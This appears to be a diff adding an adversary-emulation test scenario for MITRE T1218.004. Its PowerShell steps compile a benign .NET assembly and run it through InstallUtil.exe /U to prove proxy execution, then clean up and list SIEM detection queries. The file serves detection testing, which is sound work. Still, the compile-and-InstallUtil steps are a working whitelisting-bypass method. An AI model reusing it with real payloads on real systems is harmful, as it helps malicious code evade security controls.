@@ -1,0 +1,120 @@
+id: T1218.004_installutil
+name: "System Binary Proxy Execution — InstallUtil"
+mitre_technique: "T1218.004"
+mitre_tactic: "defense_evasion"
+description: >
+  InstallUtil.exe is a .NET utility for installing/uninstalling application components.
+  Adversaries abuse its /logfile= /logtoconsole=false /U flags to execute arbitrary
+  .NET code embedded in a specially crafted assembly — the [RunInstaller] and
+  Uninstall() method is called during the /U (uninstall) operation, allowing arbitrary
+  code execution via a signed Windows utility that may bypass application whitelisting.
+  This scenario compiles a benign InstallUtil-compatible assembly and executes it.
+author: stanleytobias
+created: "2026-01-01"
+platform: windows
+references:
+  - https://attack.mitre.org/techniques/T1218/004/
+
+steps:
+  - step: 1
+    type: marker
+    description: "Pre-execution context"
+    message: "Starting T1218.004 — InstallUtil proxy execution simulation"
+
+  - step: 2
+    type: exec_powershell
+    description: "Compile a benign InstallUtil-compatible .NET assembly"
+    command: |
+      $srcPath = "$env:TEMP\PAS_T1218_004.cs"
+      $dllPath = "$env:TEMP\PAS_T1218_004.dll"
+      $outFile = "$env:TEMP\PAS_T1218_004_fired.txt"
+
+      Set-Content $srcPath @"
+using System;
+using System.ComponentModel;
+using System.Configuration.Install;
+using System.IO;
+
+[RunInstaller(true)]
+public class PASInstaller : Installer {
+    public override void Uninstall(System.Collections.IDictionary savedState) {
+        File.WriteAllText(@"$outFile", "PAS-T1218.004-INSTALLUTIL-FIRED");
+        Console.WriteLine("PAS-T1218.004-INSTALLUTIL");
+    }
+}
+"@
+      $csc = Get-ChildItem "$env:SystemRoot\Microsoft.NET\Framework64" `
+          -Filter csc.exe -Recurse -ErrorAction SilentlyContinue |
+          Sort-Object FullName -Descending | Select-Object -First 1
+
+      if ($csc) {
+          & $csc.FullName /r:System.Configuration.Install.dll `
+              /target:library /out:$dllPath $srcPath 2>&1 | Out-Null
+          Write-Host "[PAS] Assembly compiled: $dllPath"
+      } else {
+          Write-Host "[PAS] csc.exe not found — using Add-Type fallback"
+          Add-Type -TypeDefinition (Get-Content $srcPath -Raw) `
+              -ReferencedAssemblies System.Configuration.Install `
+              -OutputAssembly $dllPath -OutputType Library -ErrorAction SilentlyContinue
+          Write-Host "[PAS] Assembly compiled via Add-Type: $dllPath"
+      }
+
+  - step: 3
+    type: exec_powershell
+    description: "Execute via InstallUtil.exe /U — triggers Uninstall() method"
+    command: |
+      $dllPath = "$env:TEMP\PAS_T1218_004.dll"
+      if (Test-Path $dllPath) {
+          $installUtil = Get-ChildItem "$env:SystemRoot\Microsoft.NET\Framework64" `
+              -Filter InstallUtil.exe -Recurse -ErrorAction SilentlyContinue |
+              Sort-Object FullName -Descending | Select-Object -First 1
+
+          if ($installUtil) {
+              Write-Host "[PAS] Executing: InstallUtil.exe /logfile= /logtoconsole=false /U $dllPath"
+              Start-Process $installUtil.FullName `
+                  -ArgumentList "/logfile= /logtoconsole=false /U $dllPath" `
+                  -Wait -NoNewWindow
+              if (Test-Path "$env:TEMP\PAS_T1218_004_fired.txt") {
+                  Write-Host "[PAS] InstallUtil Uninstall() EXECUTED via proxy"
+              }
+          } else {
+              Write-Host "[PAS] InstallUtil.exe not found"
+          }
+      } else {
+          Write-Host "[PAS] Assembly not compiled — skipping execution"
+      }
+
+  - step: 4
+    type: sleep
+    description: "Allow telemetry to flush"
+    seconds: 3
+
+  - step: 5
+    type: marker
+    description: "Post-execution prompt"
+    message: "Check SIEM — InstallUtil.exe with /U and /logfile= flags; .dll loaded from TEMP"
+
+cleanup:
+  - step: 1
+    type: exec_powershell
+    description: "Remove InstallUtil test files"
+    command: |
+      @("$env:TEMP\PAS_T1218_004.cs",
+        "$env:TEMP\PAS_T1218_004.dll",
+        "$env:TEMP\PAS_T1218_004_fired.txt") |
+          ForEach-Object { Remove-Item $_ -Force -ErrorAction SilentlyContinue }
+      Write-Host "[PAS][Cleanup] InstallUtil test files removed"
+
+  - step: 2
+    type: marker
+    description: "Cleanup complete"
+    message: "T1218.004 cleanup complete"
+
+analyst_checklist:
+  - "Process event: InstallUtil.exe with /U /logfile= /logtoconsole= arguments — bypass fingerprint"
+  - "File event: .dll created in TEMP loaded by InstallUtil.exe"
+  - "Sentinel: DeviceProcessEvents | where FileName == 'InstallUtil.exe' and ProcessCommandLine contains '/U'"
+  - "Sentinel: DeviceProcessEvents | where FileName == 'InstallUtil.exe' and ProcessCommandLine contains '/logfile='"
+  - "MDE alert: 'InstallUtil used to proxy code execution'"
+  - "CONTROL CHECK: InstallUtil.exe executing .dll or .exe from TEMP/user directory should always alert"
+  - "CONTROL CHECK: /logfile= /logtoconsole=false combination is the canonical bypass invocation — add as a specific detection"
